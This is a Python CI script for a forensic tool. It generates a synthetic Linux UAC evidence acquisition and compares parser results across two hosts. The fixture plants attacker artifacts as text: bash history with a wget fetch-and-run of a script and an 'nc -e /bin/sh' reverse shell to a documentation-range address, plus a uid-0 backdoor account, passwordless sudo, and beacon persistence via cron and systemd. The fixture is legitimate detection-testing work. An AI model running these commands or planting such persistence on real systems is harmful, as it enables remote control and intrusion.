"""The Linux/UAC case the two CI legs are compared on, and the comparison itself.

Three steps, one file, because they are one claim: `build` writes a synthetic
acquisition, `report` reduces a finished case to what the two hosts must agree
on, and `compare` says whether two reports agree. CI runs the first two on each
leg and the third once, on the pair.

**Linux/UAC and not Windows/KAPE**, on purpose. CI has no tool binaries (`aeng
setup` fetches them and they are gitignored) and every Linux parser is pure
Python, so this is the only end-to-end comparison CI can actually run. It is also
the evidence class where parity is a promise rather than an aspiration -- a
Windows acquisition read on Linux is a REDUCED run by design, and §0 of
docs/CROSS-PLATFORM.md says so.

**Everything here is invented.** Nothing came out of a case: see "Case data never
becomes text" in CLAUDE.md. The host is `synthetic-01`, the accounts are `jdoe`
and `svc_backup`, and the addresses are documentation ranges (RFC 5737, RFC 1918)
-- chosen so that grepping this repository for a real identifier finds nothing.

The case is REGENERATED on each leg rather than committed, so what is versioned
is the recipe. `CASE_VERSION` travels into the report and two reports built from
different versions are refused rather than quietly passed: they describe
different cases and are not each other's control.
"""
from __future__ import annotations

import argparse
import csv
import json
import sys
from pathlib import Path

# Bump when the recipe below changes.
CASE_VERSION = 1

HOST = "synthetic-01"
USER = "jdoe"
SERVICE_USER = "svc_backup"
ATTACKER = "198.51.100.77"      # RFC 5737 documentation range
PEER = "10.0.0.5"               # RFC 1918
WORKSTATION = "10.0.0.12"

# One fixed day, so a re-run on either leg produces the same rows. A timestamp
# that moved would reach the comparison as a difference the hosts did not cause.
DAY = "Feb 11"
YEAR = "2026"

ACQUISITION = f"uac-{HOST}-linux-20260211120000"

# What the two hosts are NOT required to agree on. Each of these is a statement
# about the machine or the moment, which is exactly what parity is net of:
#   - when it ran, and for how long
#   - which interpreter and which OS ran it
#   - which parser happened to be slowest, a fact decided by a stopwatch
#   - whether the host has a 7-Zip, which this case never needs (it holds no
#     archive) and which is a property of the installation, not of the run
_VOLATILE = {
    "generated", "started_at", "finished_at", "duration_seconds",
    "engine.python", "engine.os", "engine.os_release",
    "per_machine.time_s", "per_machine.slowest",
    "tools.archiver_present",
}


# --------------------------------------------------------------------------- #
# build
# --------------------------------------------------------------------------- #
def _write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text if text.endswith("\n") else text + "\n", encoding="utf-8")


def build(case: Path) -> Path:
    """Write the acquisition under `case` and return the acquisition directory."""
    acq = case / ACQUISITION
    root = acq / "[root]"

    # What the profile matches on (data/profiles/linux_uac.yaml).
    _write(acq / "uac.log", "\n".join([
        "-" * 80,
        "  Unix-like Artifacts Collector",
        "-" * 80,
        f"Hostname: {HOST}",
        "Operating System: linux",
        "Profile: full",
        "Collection finished",
    ]))

    # ---- identity ---------------------------------------------------------- #
    _write(root / "etc/hostname", HOST)
    _write(root / "etc/os-release", "\n".join([
        'NAME="Debian GNU/Linux"', 'VERSION_ID="12"', 'VERSION="12 (bookworm)"',
        "ID=debian", 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"',
    ]))
    _write(root / "etc/machine-id", "0f9c2b7d4a1e4f6b8c3d5e7a9b1c3d5e")
    _write(root / "etc/timezone", "Etc/UTC")

    # ---- accounts ---------------------------------------------------------- #
    # `svc_backup` carries uid 0 on purpose: a second account with the superuser
    # id is a finding both legs must reach, and reach identically.
    _write(root / "etc/passwd", "\n".join([
        "root:x:0:0:root:/root:/bin/bash",
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
        "bin:x:2:2:bin:/bin:/usr/sbin/nologin",
        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
        "sshd:x:105:65534::/run/sshd:/usr/sbin/nologin",
        f"{USER}:x:1000:1000:{USER}:/home/{USER}:/bin/bash",
        f"{SERVICE_USER}:x:0:0:backup service:/home/{SERVICE_USER}:/bin/bash",
    ]))
    _write(root / "etc/group", "\n".join([
        "root:x:0:", "sudo:x:27:" + USER, "www-data:x:33:", f"{USER}:x:1000:",
    ]))
    _write(root / "etc/shadow", "\n".join([
        "root:*:19700:0:99999:7:::",
        f"{USER}:$6$synthetic$0000000000000000000000000000000000000000:19750:0:99999:7:::",
        f"{SERVICE_USER}::19755:0:99999:7:::",
    ]))
    _write(root / "etc/sudoers", "\n".join([
        "Defaults    env_reset",
        "root    ALL=(ALL:ALL) ALL",
        "%sudo   ALL=(ALL:ALL) ALL",
        f"{SERVICE_USER} ALL=(ALL) NOPASSWD: ALL",
    ]))

    # ---- authentication ---------------------------------------------------- #
    # A failed burst from one address and then a success on the same account: the
    # shape a brute force leaves, and a row count that must not differ.
    auth = [f"{DAY} 03:1{i % 6}:0{i % 10} {HOST} sshd[{2000 + i}]: Failed password "
            f"for {USER} from {ATTACKER} port {40000 + i} ssh2" for i in range(12)]
    auth += [
        f"{DAY} 03:22:14 {HOST} sshd[2101]: Accepted password for {USER} "
        f"from {ATTACKER} port 40112 ssh2",
        f"{DAY} 03:22:14 {HOST} sshd[2101]: pam_unix(sshd:session): session opened "
        f"for user {USER}(uid=1000) by (uid=0)",
        f"{DAY} 03:24:02 {HOST} sudo:     {USER} : TTY=pts/0 ; PWD=/home/{USER} ; "
        "USER=root ; COMMAND=/bin/bash",
        f"{DAY} 03:24:02 {HOST} sudo: pam_unix(sudo:session): session opened for "
        "user root(uid=0) by jdoe(uid=1000)",
        f"{DAY} 03:31:47 {HOST} useradd[2210]: new user: name={SERVICE_USER}, "
        f"UID=0, GID=0, home=/home/{SERVICE_USER}, shell=/bin/bash",
        f"{DAY} 04:02:11 {HOST} sshd[2400]: Invalid user admin from {ATTACKER} "
        "port 41022",
        f"{DAY} 08:14:33 {HOST} sshd[3010]: Accepted publickey for {USER} from "
        f"{WORKSTATION} port 51882 ssh2: RSA SHA256:0000000000000000",
    ]
    _write(root / "var/log/auth.log", "\n".join(auth))

    # ---- shell history ----------------------------------------------------- #
    _write(root / f"home/{USER}/.bash_history", "\n".join([
        "ls -la", "cd /var/www/html", "cat /etc/passwd",
        f"wget http://{ATTACKER}/x.sh -O /tmp/x.sh",
        "chmod +x /tmp/x.sh", "/tmp/x.sh",
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "history -c",
    ]))
    _write(root / "root/.bash_history", "\n".join([
        "apt update", "systemctl status ssh", "journalctl -u ssh --no-pager",
    ]))
    _write(root / f"home/{SERVICE_USER}/.bash_history", "\n".join([
        "find / -perm -4000 -type f 2>/dev/null",
        f"nc -e /bin/sh {ATTACKER} 4444",
    ]))

    # ---- persistence ------------------------------------------------------- #
    _write(root / "etc/crontab", "\n".join([
        "SHELL=/bin/sh", "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin",
        "17 *  * * *   root    cd / && run-parts --report /etc/cron.hourly",
        "*/5 * * * *   root    /usr/local/bin/collect.sh",
    ]))
    _write(root / f"var/spool/cron/crontabs/{USER}", "\n".join([
        f"# DO NOT EDIT THIS FILE - edit the master and reinstall ({USER})",
        "*/10 * * * * /tmp/.cache/beacon >/dev/null 2>&1",
    ]))
    _write(root / "etc/systemd/system/backup-agent.service", "\n".join([
        "[Unit]", "Description=Backup agent", "",
        "[Service]", "Type=simple", "ExecStart=/tmp/.cache/beacon", "Restart=always",
        "", "[Install]", "WantedBy=multi-user.target",
    ]))
    _write(root / "etc/systemd/system/ssh.service", "\n".join([
        "[Unit]", "Description=OpenBSD Secure Shell server", "",
        "[Service]", "ExecStart=/usr/sbin/sshd -D", "",
        "[Install]", "WantedBy=multi-user.target",
    ]))
    _write(root / f"home/{USER}/.ssh/authorized_keys",
           "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0000000000000000000000000000 "
           f"{USER}@workstation")
    _write(root / f"home/{USER}/.ssh/known_hosts",
           f"{PEER} ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI0000000000000000000000000")
    _write(root / "etc/ssh/sshd_config", "\n".join([
        "Port 22", "PermitRootLogin yes", "PasswordAuthentication yes",
        "PubkeyAuthentication yes", "X11Forwarding yes",
    ]))

    # ---- network ----------------------------------------------------------- #
    _write(root / "etc/hosts", "\n".join([
        "127.0.0.1   localhost", f"{PEER}   fileserver", f"127.0.1.1   {HOST}",
    ]))
    _write(root / "etc/resolv.conf", "nameserver 10.0.0.1\nsearch example.local")

    # ---- packages and system logs ------------------------------------------ #
    _write(root / "var/log/dpkg.log", "\n".join([
        f"{YEAR}-02-10 22:14:01 status installed openssh-server:amd64 1:9.2p1-2",
        f"{YEAR}-02-11 03:33:52 status installed netcat-traditional:amd64 1.10-47",
    ]))
    _write(root / "var/log/syslog", "\n".join([
        f"{DAY} 03:22:15 {HOST} systemd[1]: Started Session 4 of user {USER}.",
        f"{DAY} 03:33:52 {HOST} systemd[1]: Reloading.",
        f"{DAY} 03:34:10 {HOST} systemd[1]: Started Backup agent.",
    ]))
    _write(root / "var/log/kern.log", "\n".join([
        f'{DAY} 03:34:11 {HOST} kernel: [ 1042.113] audit: type=1400 '
        'apparmor="DENIED" operation="exec" profile="/usr/sbin/sshd"',
    ]))

    return acq


# --------------------------------------------------------------------------- #
# report
# --------------------------------------------------------------------------- #
def _prune(value, prefix: str = ""):
    """The summary with the volatile keys removed, at any depth."""
    if isinstance(value, dict):
        return {k: _prune(v, f"{prefix}{k}.") for k, v in sorted(value.items())
                if f"{prefix}{k}" not in _VOLATILE}
    if isinstance(value, list):
        return [_prune(v, prefix) for v in value]
    return value


# Real evidence carries fields far past the csv module's 131,072-byte default -- a
# PowerShell script block, a decoded command line -- and the reader raises on the
# first one. MEASURED: the report crashed on a real KAPE acquisition on both hosts.
# The largest limit every platform's C long can hold.
csv.field_size_limit(2**31 - 1)


def _rows(path: Path) -> int:
    """Data rows, counted with the csv reader rather than by newlines: a quoted
    field may hold one, and a count that drifts with the content would read as a
    parity failure."""
    with open(path, newline="", encoding="utf-8", errors="replace") as fh:
        return max(sum(1 for _ in csv.reader(fh)) - 1, 0)


def report(case: Path) -> dict:
    """What the two legs must agree on: the summary net of the moment and the
    machine, plus the SIZE of every table produced.

    The row counts are not in the summary and are the reason this is not just a
    diff of it. Two hosts can both report `ok` for a parser and disagree about
    what it found -- a case-folding difference, a path flavour, a locale -- and
    that divergence is invisible in a status. Zero rows reading as no attack is
    this project's worst failure, and it would pass a status-only comparison.
    """
    summary = json.loads((case / "run-summary.json").read_text(encoding="utf-8"))
    tables = {}
    for csv_path in sorted(case.rglob("*.csv")):
        rel = csv_path.relative_to(case).as_posix()
        if rel == "traces.csv":
            continue          # custody of the fixture, not a parser's output
        tables[rel] = _rows(csv_path)
    return {"case_version": CASE_VERSION, "summary": _prune(summary), "tables": tables}


# --------------------------------------------------------------------------- #
# compare
# --------------------------------------------------------------------------- #
def _differences(a, b, path: str = "") -> list[str]:
    if isinstance(a, dict) and isinstance(b, dict):
        out = []
        for key in sorted(set(a) | set(b)):
            here = f"{path}.{key}" if path else key
            if key not in a:
                out.append(f"{here}: missing on the first leg, {b[key]!r} on the second")
            elif key not in b:
                out.append(f"{here}: {a[key]!r} on the first leg, missing on the second")
            else:
                out += _differences(a[key], b[key], here)
        return out
    if isinstance(a, list) and isinstance(b, list):
        if len(a) != len(b):
            return [f"{path}: {len(a)} entries on the first leg, {len(b)} on the second"]
        out = []
        for i, (x, y) in enumerate(zip(a, b)):
            out += _differences(x, y, f"{path}[{i}]")
        return out
    return [] if a == b else [f"{path}: {a!r} vs {b!r}"]


def compare(first: Path, second: Path) -> int:
    a = json.loads(first.read_text(encoding="utf-8"))
    b = json.loads(second.read_text(encoding="utf-8"))

    if a.get("case_version") != b.get("case_version"):
        print(f"[!] different case recipes (v{a.get('case_version')} vs "
              f"v{b.get('case_version')}): these describe different cases and are "
              f"not each other's control. Rebuild both.")
        return 1

    diffs = _differences(a, b)
    if diffs:
        print(f"[!] the two legs disagree on {len(diffs)} thing(s):")
        for d in diffs:
            print(f"      {d}")
        return 1

    tables = a.get("tables", {})
    print(f"[+] the two legs agree: {a['summary']['machines']} machine(s), "
          f"{len(tables)} table(s), {sum(tables.values())} row(s), "
          f"status {a['summary']['status']}")
    return 0


# --------------------------------------------------------------------------- #
def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(prog="parity", description=__doc__.splitlines()[0])
    sub = ap.add_subparsers(dest="command", required=True)

    pb = sub.add_parser("build", help="write the synthetic case")
    pb.add_argument("-o", "--out", required=True)

    pr = sub.add_parser("report", help="reduce a finished case to its comparable form")
    pr.add_argument("-p", "--path", required=True)
    pr.add_argument("-o", "--out", required=True)

    pc = sub.add_parser("compare", help="diff two reports")
    pc.add_argument("first")
    pc.add_argument("second")

    args = ap.parse_args(argv)

    if args.command == "build":
        case = Path(args.out).resolve()
        acq = build(case)
        print(f"[+] case v{CASE_VERSION} -> {case}")
        print(f"    acquisition {acq.name}, "
              f"{sum(1 for p in case.rglob('*') if p.is_file())} file(s)")
        return 0

    if args.command == "report":
        data = report(Path(args.path).resolve())
        out = Path(args.out).resolve()
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(json.dumps(data, indent=2, sort_keys=True), encoding="utf-8")
        print(f"[+] {out}: {len(data['tables'])} table(s), "
              f"{sum(data['tables'].values())} row(s)")
        return 0

    return compare(Path(args.first), Path(args.second))


if __name__ == "__main__":
    sys.exit(main())
